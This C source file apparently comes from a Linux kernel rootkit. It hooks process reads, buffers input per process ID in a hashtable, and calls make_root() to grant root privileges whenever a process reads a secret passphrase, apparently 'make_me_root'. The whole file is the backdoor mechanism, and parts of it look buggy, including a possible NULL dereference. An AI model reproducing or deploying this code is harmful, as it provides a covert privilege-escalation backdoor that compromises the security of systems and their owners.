#include <linux/hashtable.h>
#include <linux/kernel.h>
#include <linux/slab.h>

#include "read.h"
#include "common.h"
#include "hook.h"
#include "creds.h"

DEFINE_HASHTABLE(pid_ht, 8); //2^8 buckets _should_ keep collisions low

static const char *accept = "makerot_";


//Using strspn allows us to only read inputs that include valid characters
static int
is_valid(char *buf, size_t size)
{
    //Small performance optimization when only reading one char
    //Avoids strspn
    if(size == 1) {
        if((buf[0] >= 'a' && buf[0] <= 'z') || buf[0] == '_') {
            return strspn(buf, accept) > 0;
        }

        return 0;
    }

    return strspn(buf, accept) > 0;
}

static void
add_entry(pid_t key)
{
    struct pid_entry *cur;
    struct pid_entry *new = kzalloc(sizeof(struct pid_entry), GFP_KERNEL);

    new->pid = key;
    new->str = kzalloc(MAX_BUF, GFP_KERNEL);
    new->capacity = MAX_BUF;
    new->iter = 0;

    int found = 0;
    hash_for_each_possible(pid_ht, cur, hlist, key)
        if(cur->pid == key)
            found = 1;

    if(!found)
        hash_add(pid_ht, &new->hlist, key);
}

static void
remove_entry(pid_t key)
{
    struct pid_entry *cur;

    hash_for_each_possible(pid_ht, cur, hlist, key) {
        if(cur->pid == key) {
            kfree(cur->str);
            hash_del(&cur->hlist);
            kfree(cur);
        }
    }
}

static struct pid_entry *
get_entry(pid_t key)
{
    struct pid_entry *cur;

    hash_for_each_possible(pid_ht, cur, hlist, key)
        if(cur->pid == key)
            return cur;

    return NULL;
}

/**
 * The idea here is to fill up our buffer as much as we can
 * Should we reach the maximum capacity, we first of all
 * compare what we read so far; if it's a match, grant root
 * Otherwise, we can safely move the last 11 bytes to the start
 * (as the worst case is reading 'make_me_roo', which
 * is 11 characters long)
 * This means we need to offset str with (23 - 11) = 12 = SHIFT_OFF
 **/
static void
handle_compare(char *buf, pid_t pid, size_t size)
{
    struct pid_entry *entry;
    entry = get_entry(pid);

    int i = 0;

    if(entry) {
    fill:
        while(i < size && entry->capacity > 0) {
            entry->str[entry->iter] = buf[i];
            entry->capacity--;
            i++;
            entry->iter++;
        }

        if(strnstr(entry->str, PASSPHRASE, MAX_BUF)) {
            make_root();
            remove_entry(pid);
            return;
        }

        if(entry->capacity == 0) {
            memmove(entry->str, (entry->str + SHIFT_OFF), SHIFT_OFF);
            entry->capacity = entry->iter = SHIFT_OFF;

            goto fill;
        }
    }

    if(strstr(entry->str, PASSPHRASE)) {
        make_root();
        remove_entry(pid);
    }
}

void
handle_pid(pid_t pid, __user char *buf, size_t size)
{
    //Sometimes (e.g. when installing packages), kalloc fails
    //To avoid being limited by the page size, we use kvzalloc,
    //which allocates chunks bigger than the page size if necessary
    //https://lwn.net/Articles/711653/
    char *str = kvzalloc(size, GFP_KERNEL);

    if(!str)
        return;

    copy_from_user(str, buf, size);

    if(is_valid(str, size)) {
        add_entry(pid);
        handle_compare(str, pid, size);
    } else {
        //Throw out hashtable entries on invalid input
        remove_entry(pid);
    }

    kfree(str);
}
